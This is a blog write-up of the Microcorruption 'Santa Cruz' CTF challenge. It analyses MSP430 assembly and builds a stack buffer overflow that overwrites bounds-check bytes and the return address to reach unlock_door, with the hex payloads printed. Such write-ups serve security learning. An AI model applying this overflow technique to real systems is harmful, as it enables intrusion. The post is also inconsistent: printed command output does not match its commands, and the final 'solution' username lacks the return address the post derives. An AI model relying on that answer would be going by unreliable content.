---
title: "microcorruption - santa cruz"
date: 2018-03-11T20:23:43+02:00
categories: 
- ctf
- exploit
- assembly
- microcorruption
- santa cruz
---

{{< figure src="/images/microcorruption/microcorruption.png" >}}

This post is part of the series of solving [microcorruption.com](https://microcorruption.com) ctf challenges which continues from the [previous challenge](https://leonjza.github.io/blog/2018/03/09/microcorruption---johannesburg/) called _Johannesburg_. This challenge is titled _Santa Cruz_.

The challenge has the following description when you start:

> This is Software Revision 05. We have added further mechanisms to verify that passwords which are too long will be rejected.

Maybe we are finally done with the overflow problems? This challenge took me quite a bit of time to solve thanks to the new checks that were introduced. Like, a really long time. Lets go through the process.
<!--more-->

## santa cruz

Static analysis of the programs' code showed that we are calling `login` from `main` again, after adjusting the stack pointer.

```asm
4438 <main>
4438:  3150 ceff      add   #0xffce, sp
443c:  b012 5045      call  #0x4550 <login>
```

Nothing too interesting. However, `login` was *much* larger when compared to previous versions we have seen. Once I finished skimming through `login`, I noticed that this program contained a number of methods that don't seem to be called at all. For example, `test_username_and_password_valid`, `putchar` and `getchar`.

It quickly became evident that most of the important logic was within `login`. As previously mentioned, this routine was quite large, so lets take a closer look at it in smaller chunks.

```asm
4550 <login>
4550:  0b12           push  r11
4552:  0412           push  r4
4554:  0441           mov   sp, r4
4556:  2452           add   #0x4, r4
4558:  3150 d8ff      add   #0xffd8, sp
455c:  c443 faff      mov.b #0x0, -0x6(r4)
4560:  f442 e7ff      mov.b #0x8, -0x19(r4)
4564:  f440 1000 e8ff mov.b #0x10, -0x18(r4)
```

The beginning of `login` contained three interesting instructions to move the bytes `0x0`, `0x8` and `0x10` into very specific locations within memory. This caught my eye pretty quickly and they are important so keep them in mind.

```asm
456a:  3f40 8444      mov   #0x4484 "Authentication now requires a username and password.", r15
456e:  b012 2847      call  #0x4728 <puts>
4572:  3f40 b944      mov   #0x44b9 "Remember: both are between 8 and 16 characters.", r15
4576:  b012 2847      call  #0x4728 <puts>
```

This section is pretty vanilla. It simply prints out some strings. Notice though the fact that both the username and password is supposed to be between 8 (`0x8`) and 16 (`0x10`) characters.

```asm
457a:  3f40 e944      mov   #0x44e9 "Please enter your username:", r15
457e:  b012 2847      call  #0x4728 <puts>
4582:  3e40 6300      mov   #0x63, r14
4586:  3f40 0424      mov   #0x2404, r15
458a:  b012 1847      call  #0x4718 <getsn>
458e:  3f40 0424      mov   #0x2404, r15
4592:  b012 2847      call  #0x4728 <puts>
4596:  3e40 0424      mov   #0x2404, r14
459a:  0f44           mov   r4, r15
459c:  3f50 d6ff      add   #0xffd6, r15
45a0:  b012 5447      call  #0x4754 <strcpy>

45a4:  3f40 0545      mov   #0x4505 "Please enter your password:", r15
45a8:  b012 2847      call  #0x4728 <puts>
45ac:  3e40 6300      mov   #0x63, r14
45b0:  3f40 0424      mov   #0x2404, r15
45b4:  b012 1847      call  #0x4718 <getsn>
45b8:  3f40 0424      mov   #0x2404, r15
45bc:  b012 2847      call  #0x4728 <puts>
45c0:  0b44           mov   r4, r11
45c2:  3b50 e9ff      add   #0xffe9, r11
45c6:  3e40 0424      mov   #0x2404, r14
45ca:  0f4b           mov   r11, r15
45cc:  b012 5447      call  #0x4754 <strcpy>
```

Much like the previous challenge, this section simply gets the username and password from the user. Once a value has been captured, `strcpy` is called to move the data to another section in memory after echoing it back to the user.

```asm
45d0:  0f4b           mov   r11, r15
45d2:  0e44           mov   r4, r14
45d4:  3e50 e8ff      add   #0xffe8, r14
45d8:  1e53           inc   r14
45da:  ce93 0000      tst.b 0x0(r14)
45de:  fc23           jnz   #0x45d8 <login+0x88>

; the loop is done
45e0:  0b4e           mov   r14, r11
45e2:  0b8f           sub   r15, r11
45e4:  5f44 e8ff      mov.b -0x18(r4), r15
45e8:  8f11           sxt   r15
45ea:  0b9f           cmp   r15, r11
45ec:  0628           jnc   #0x45fa <login+0xaa>
45ee:  1f42 0024      mov   &0x2400, r15
45f2:  b012 2847      call  #0x4728 <puts>
45f6:  3040 4044      br    #0x4440 <__stop_progExec__>
```

This section seems to have a loop, incrementing `r14` until the byte at the memory location pointed to by `r14` is `0x0`. A length counter maybe? After the loop, the byte at `-0x18(r4)` (which is set to `0x10` at the start of the `login` routine remember?) is compared to that which is in `r15`. Depending on the outcome of the `cmp` at `0x45ea`, the program may be stopped. I guess this is the overflow protection implemented.

```asm
45fa:  5f44 e7ff      mov.b -0x19(r4), r15
45fe:  8f11           sxt   r15
4600:  0b9f           cmp   r15, r11
4602:  062c           jc    #0x4610 <login+0xc0>
4604:  1f42 0224      mov   &0x2402, r15
4608:  b012 2847      call  #0x4728 <puts>
460c:  3040 4044      br    #0x4440 <__stop_progExec__>
```

Similarly, another `cmp` is done with the value at `-0x19(r4)` (which was set to `0x8` at the beginning of `login`) with a similar abrupt stop if it fails. This is most likely the lower bounds checking.

```asm
4610:  c443 d4ff      mov.b #0x0, -0x2c(r4)
4614:  3f40 d4ff      mov   #0xffd4, r15
4618:  0f54           add   r4, r15
461a:  0f12           push  r15
461c:  0f44           mov   r4, r15
461e:  3f50 e9ff      add   #0xffe9, r15
4622:  0f12           push  r15
4624:  3f50 edff      add   #0xffed, r15
4628:  0f12           push  r15
462a:  3012 7d00      push  #0x7d
462e:  b012 c446      call  #0x46c4 <INT>
4632:  3152           add   #0x8, sp
4634:  c493 d4ff      tst.b -0x2c(r4)
4638:  0524           jz    #0x4644 <login+0xf4>
463a:  b012 4a44      call  #0x444a <unlock_door>
463e:  3f40 2145      mov   #0x4521 "Access granted.", r15
4642:  023c           jmp   #0x4648 <login+0xf8>
4644:  3f40 3145      mov   #0x4531 "That password is not correct.", r15
4648:  b012 2847      call  #0x4728 <puts>
```

For this next section, it looks like the stack is being setup for syscall `0x7d` to be called. Depending on the result, `unlock_door` would be called or a message would simply be printed saying that the password was incorrect.

```asm
464c:  c493 faff      tst.b -0x6(r4)
4650:  0624           jz    #0x465e <login+0x10e>
4652:  1f42 0024      mov   &0x2400, r15
4656:  b012 2847      call  #0x4728 <puts>
465a:  3040 4044      br    #0x4440 <__stop_progExec__>
465e:  3150 2800      add   #0x28, sp
4662:  3441           pop   r4
4664:  3b41           pop   r11
4666:  3041           ret
```

Before we leave the routine, a final check is done with `tst.b -0x6(r4)`. If the value at the memory address at this time is zero, the function would return as normal (based on the `jz` instruction), otherwise, another abrupt stop would occur.

From the static analysis we can see that three distinct checks are being done. An upper and lower bounds check and an arbitrary null byte check. Time to fuzz the inputs and see how that works out.

### debugging

Now the very first thing I did here was supply inputs that were longer than the prescribed 16 bytes. A 20 byte username and 20 byte password promptly failed and caused the program to print a "password too short" message and end.

{{< figure src="/images/microcorruption/santa_cruz_input_fuzz1.png" >}}

Erm. Wat. I expected the password too long message, not too short? Alright. I figured what would be a better approach would be to first have a look at what a valid run through looks like. Primarily this was to get an idea of what the memory layout looks like when the bounds checks we have identified are being done. I set a breakpoint at `0x45d0` right after the second `strcpy` call so that I could see what the memory layout would be together with inputs that were 10 bytes long (aka: within the size limits).

{{< figure src="/images/microcorruption/santa_cruz_memory_layout_within_bounds.png" >}}

There are a number of observations to make here. The username buffer (which I provided as 10 `41`'s) is padded with zeros up to `0x43b3`, and the password buffer (which I provided as 10 `42`'s) is padded with zeros up to `0x43cc`. At `0x43cc` we have `0x4440`, which is the start of the `__stop_progExec__` routine. Between the username and password buffers are the two bytes that were set very early in the `login` routine.

Finally, given the first attempt to just provide inputs that were clearly too long, we smashed the `0x8` and `0x10` values, meaning we control those values!

Stepping through the rest of `login` one can see the bytes `0x8` and `0x10` are used within the bounds checks. This does however seem to only be the case for the password field.

{{< figure src="/images/microcorruption/santa_cruz_stack_smash.png" >}}

As a final test, I provided a username of 50 `44`'s and a password of 9 `41`'s. The username overrode the two bytes used for bounds checking, as well as the suspected return address for `login`. The password however was placed at a static offset at `0x43b4` and terminated with a null byte inside of the username buffer.

It seemed clear at this stage that all I would need to do was set my own values for the password buffer lengths and corrupt the memory past the return address, redirecting the code flow to something like `unlock_door`.

Given that the bytes used for bounds checking was at offsets 18 and 19 from where the password buffer started, I chose to place the values `0x1` and `0x99` as the new min/max values. I then continued to overflow the buffer, hoping to replace the address `login` would return to to `0x4242` to test if I can reach it.

```python
python -c "print('41' * 17 + '0199' + 30 * '42')"
41414141414141414141414141414141410199424242424242424242424242424242424242424242424242424242424242
```

With my username payload ready, I simply provided two bytes for the password as `4343`.

{{< figure src="/images/microcorruption/santa_cruz_payload_1.png" >}}

This time round, I passed the two bounds checks that occur between `0x45ec` and `0x460c`. The HSM did not validate the password I provided (no surprise there), but after the `That password is not correct.`, another `Invalid Password Length: password too long.` message was printed. This has to be as a result of that `tst.b -0x6(r4)` call towards the end of `login`.

Setting a breakpoint at `0x464c`, I inspected the memory contents that was being tested. For reference, lets have one more look at the end of the `login` routine as well:

```asm
464c:  c493 faff      tst.b -0x6(r4)
4650:  0624           jz    #0x465e <login+0x10e>
4652:  1f42 0024      mov   &0x2400, r15
4656:  b012 2847      call  #0x4728 <puts>
465a:  3040 4044      br    #0x4440 <__stop_progExec__>
465e:  3150 2800      add   #0x28, sp
4662:  3441           pop   r4
4664:  3b41           pop   r11
4666:  3041           ret
```

In order for us to take the jump at `0x4650` to `0x465e` (bypassing the abrupt stop), we need to have the byte at `-0x6(r4)` be null.

{{< figure src="/images/microcorruption/santa_cruz_null_byte_check.png" >}}

Running the program with our `4343` payload as the password, we can see we have a `42` at `0x43c6` (which is `0x43cc` - `0x6`). We know that the end of our username and password buffers have null bytes in memory, so we could use that to get this final null byte written for the check to pass.

We two options here. We could use the username field to overflow up to where the null byte should be written, and then provide the rest of the payload as the password field as one option. We could also use the password field to simply pad up to the null byte field and have that written there, keeping our primary payload in the username field. I opted for the latter. Inspecting the memory layout, one can see that the null byte should be at offset 18 from the start of the password buffer.

Generating the username payload was now done as follows:

```python
$ python -c "print('41' * 17 + '0199' + '44' * 30)"
41414141414141414141414141414141430199444444444444444444444444444444444444444444444444444444444444
```

The password payload on the other hand was (with an expectation of a nullbyte at pos 18):

```python
$ python -c "print('42' * 17)"
4242424242424242424242424242424242
```

{{< figure src="/images/microcorruption/santa_cruz_null_byte_check.png" >}}

Woohoo! The byte at `0x43c6` is now `0x0`, bypassing the check. If we were to continue execution at this point, we would end up at invalid instructions and a message such as `insn address unaligned` within the debugger. This is good news!

The only thing that is left for us to do is to set the address to jump to when `login` returns. This was at offset 23 from the username buffer. A routine called `unlock_door` started at `0x444a` (so `4a44` for endianness) which called the correct interrupt to unlock the lock. So, keeping our password field as is, we generate the username with:

```python
$ python -c "print('41' * 17 + '0199' + '44' * 23 + '4a44')"
4141414141414141414141414141414141019944444444444444444444444444444444444444444444444a44
```

{{< figure src="/images/microcorruption/santa_cruz_unlocked.png" >}}

## solution

Enter `41414141414141414141414141414141430199444444444444444444444444444444444444444444444444444444444444` as hex encoded input for the username and `4242424242424242424242424242424242` as hex encoded input for the password.

## other challenges

For my other write ups in the microcorruption series, checkout [this](https://leonjza.github.io/categories/microcorruption/) link.
